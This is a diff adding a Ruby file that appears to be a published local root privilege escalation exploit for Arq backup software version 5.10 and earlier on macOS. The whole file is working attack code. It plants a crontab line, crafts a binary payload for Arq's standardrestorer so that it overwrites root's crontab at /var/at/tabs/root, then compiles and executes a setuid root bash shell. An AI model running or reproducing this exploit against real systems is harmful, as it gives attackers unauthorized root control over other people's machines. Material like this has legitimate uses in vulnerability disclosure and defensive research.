@@ -1,0 +1,286 @@
+#!/usr/bin/env ruby
+
+#################################################################
+###### Arq <= 5.10 local root privilege escalation exploit ######
+###### by m4rkw - https://m4.rkw.io/blog.html              ######
+#################################################################
+######                                                     ######
+###### Usage:                                              ######
+######                                                     ######
+###### ./arq_5.10.rb  # stage 1                            ######
+######                                                     ######
+###### (wait for next Arq backup run)                      ######
+######                                                     ######
+###### ./arq_5.10.rb  # stage 2                            ######
+######                                                     ######
+###### if you know the HMAC from a previous run:           ######
+######                                                     ######
+###### ./arq_5.10.rb stage2 <hmac>                         ######
+######                                                     ######
+#################################################################
+###### USE AT YOUR OWN RISK - THIS WILL OVERWRITE THE ROOT ######
+###### USER'S CRONTAB!                                     ######
+#################################################################
+
+$binary_target = "/tmp/arq_510_exp"
+
+class Arq510PrivEsc
+  def initialize(args)
+    @payload_file = ".arq_510_exp_payload"
+    @hmac_file = ENV["HOME"] + "/.arq_510_exp_hmac"
+    @backup_file = ENV["HOME"] + "/" + @payload_file
+
+    @target = shell("ls -1t ~/Library/Arq/Cache.noindex/ |head -n1")
+    @bucket_uuid = shell("grep 'writing head blob key' " +
+      "~/Library/Logs/arqcommitter/* |tail -n1 |sed 's/^.*key //' |cut -d " +
+      "' ' -f4")
+    @computer_uuid = shell("cat ~/Library/Arq/config/app_config.plist |grep " +
+      "-A1 #{@target} |tail -n1 |xargs |cut -d '>' -f2 |cut -d '<' -f1")
+    @backup_endpoint = shell("cat ~/Library/Arq/config/targets/#{@target}.target " +
+      "|grep -A1 '>endpointDescription<' |tail -n1 |xargs |cut -d '>' -f2 " +
+      "| cut -d '<' -f1")
+    @latest_backup_set = latest_backup_set
+
+    puts "         target: #{@target}"
+    puts "    bucket uuid: #{@bucket_uuid}"
+    puts "  computer uuid: #{@computer_uuid}"
+    puts "backup endpoint: #{@backup_endpoint}"
+    puts "  latest backup: #{@latest_backup_set}\n\n"
+
+    if args.length >0
+      method = args.shift
+      if respond_to? method
+        send method, *args
+      end
+    else
+      if File.exist? @hmac_file
+        method = :stage2
+      else
+        method = :stage1
+      end
+
+      send method
+    end
+  end
+
+  def shell(command)
+    `#{command}`.chomp
+  end
+
+  def latest_backup_set
+    shell("grep 'writing head blob' ~/Library/Logs/arqcommitter/* |tail -n1 " +
+      "|sed 's/.*key //' |cut -d ' ' -f1")
+  end
+
+  def scan_hmac_list
+    packsets_path = shell("find ~/Library/Arq/ -type d -name packsets")
+    hmac = {}
+
+    shell("strings #{packsets_path}/*-trees.db").split("\n").each do |line|
+      if (m = line.match(/[0-9a-fA-F]+/)) and m[0].length == 40
+        if !hmac.include? m[0]
+          hmac[m[0]] = 1
+        end
+      end
+    end
+
+    hmac
+  end
+
+  def stage1
+    print "building HMAC cache... "
+
+    hmac = scan_hmac_list
+
+    File.open(@hmac_file, "w") do |f|
+      f.write(@latest_backup_set + "\n" + hmac.keys.join("\n"))
+    end
+
+    puts "done - stored at #{@hmac_file}"
+
+    print "dropping backup file... "
+
+    File.open(@backup_file, "w") do |f|
+      f.write("* * * * * /usr/sbin/chown root:wheel #{$binary_target} &&" +
+        "/bin/chmod 4755 #{$binary_target}\n")
+    end
+
+    puts "done"
+    puts "wait for the next backup run to complete and then run again"
+  end
+
+  def stage2(target_hmac=nil)
+    if !target_hmac
+      if !File.exist? @hmac_file
+        raise "hmac list not found."
+      end
+
+      print "loading HMAC cache... "
+
+      data = File.read(@hmac_file).split("\n")
+
+      puts "done"
+
+      initial_backup_set = data.shift
+
+      if initial_backup_set == @latest_backup_set
+        puts "no new backup created yet"
+        exit 1
+      end
+
+      hmac = {}
+      data.each do |h|
+        hmac[h] = 1
+      end
+
+      hmac_targets = []
+
+      print "scanning for HMAC targets... "
+
+      scan_hmac_list.keys.each do |h|
+        if !hmac[h]
+          hmac_targets.push h
+        end
+      end
+
+      puts "done"
+
+      if hmac_targets.length == 0
+        puts "no HMAC targets, unable to continue."
+        exit 0
+      end
+
+      puts "found #{hmac_targets.length} HMAC targets"
+
+      hmac_targets.each do |hmac|
+        attempt_exploit(hmac)
+      end
+    else
+      attempt_exploit(target_hmac)
+    end
+  end
+
+  def build_payload(hmac)
+    d = "\x01\x00\x00\x00\x00\x00\x00\x00"
+    e = "\x00\x00\x00\x00\x03"
+
+    @overwrite_path = '/var/at/tabs/root'
+
+    plist = "
+<plist version=\"1.0\">
+    <dict>
+        <key>Endpoint</key>
+        <string>#{@backup_endpoint}</string>
+        <key>BucketUUID</key>
+        <string>#{@bucket_uuid}</string>
+        <key>BucketName</key>
+        <string>/</string>
+        <key>ComputerUUID</key>
+        <string>#{@computer_uuid}</string>
+        <key>LocalPath</key>
+        <string>/</string>
+        <key>LocalMountPoint</key>
+        <string>/</string>
+        <key>StorageType</key>
+        <integer>1</integer>
+        <key>SkipDuringBackup</key>
+        <false></false>
+        <key>ExcludeItemsWithTimeMachineExcludeMetadataFlag</key>
+        <false></false>
+    </dict>
+</plist>"
+
+    hex = plist.length.to_s(16).rjust(4,'0')
+    plist_size = (hex[0,2].to_i(16).chr + hex[2,2].to_i(16).chr)
+
+    pfl = @payload_file.length.chr
+    opl = @overwrite_path.length.chr
+    bel = @backup_endpoint.length.chr
+
+    payload = sprintf(
+      (
+        "%s\$%s%s%s%s\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00" +
+        "\x00\x00\x00\x00\x00\x09\x00\x00\x02\xd0\x96\x82\xef\xd8\x00\x00\x00" +
+        "\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x08\x30" +
+        "\x2e\x30\x30\x30\x30\x30\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00%s%s%s\x28%s\x01\x00\x00\x00%s" +
+        "\x00\x00\x00%s%s%s\x00\x00\x00\x16\x00\x00\x00\x02%s\x28%s\x01\x00" +
+        "\x00\x00%s\x00\x00\x00%s%s%s\x00\x00\x00\x00\x00\x00\x01\xf5\x00\x00" +
+        "\x00\x00\x00\x00\x00\x14\x00%s%s%s\x00\x00\x00\x03%s\x0a"
+      ).force_encoding('ASCII-8BIT'),
+        d, @target,
+        d, bel, @backup_endpoint,
+        plist_size, plist,
+        d, @latest_backup_set,
+        d, d, pfl, @payload_file,
+        d, hmac,
+        d, d, pfl, @payload_file,
+        d, opl, @overwrite_path,
+        e * 10
+      )
+
+    return payload
+  end
+
+  def attempt_exploit(hmac)
+    print "trying HMAC: #{hmac} ... "
+
+    File.open("/tmp/.arq_exp_510_payload","w") do |f|
+      f.write(build_payload(hmac))
+    end
+
+    output = shell("cat /tmp/.arq_exp_510_payload | " +
+      "/Applications/Arq.app/Contents/Resources/standardrestorer 2>/dev/null")
+
+    File.delete("/tmp/.arq_exp_510_payload")
+
+    if output.include?("Creating directory structure") and !output.include?("failed")
+      puts "SUCCESS"
+
+      print "compiling shell invoker... "
+
+      shellcode = "#include <unistd.h>\nint main()\n{ setuid(0);setgid(0);" +
+        "execl(\"/bin/bash\",\"bash\",\"-c\",\"rm -f #{$binary_target};rm -f " +
+        "/var/at/tabs/root;/bin/bash\","+ "NULL);return 0; }"
+
+      IO.popen("gcc -xc -o #{$binary_target} -", mode="r+") do |io|
+        io.write(shellcode)
+        io.close
+      end
+
+      puts "done"
+
+      print "waiting for root+s... "
+
+      timeout = 61
+      i = 0
+      stop = false
+
+      while i < timeout
+        s = File.stat($binary_target)
+
+        if s.mode == 0104755 and s.uid == 0
+          puts "\n"
+          exec($binary_target)
+        end
+
+        sleep 1
+        i += 1
+
+        if !stop
+          left = 60 - Time.now.strftime("%S").to_i
+          left == 1 && stop = true
+
+          print "#{left} "
+        end
+      end
+
+      puts "exploit failed"
+      exit 0
+    else
+      puts "FAIL"
+    end
+  end
+end
+
+Arq510PrivEsc.new(ARGV)
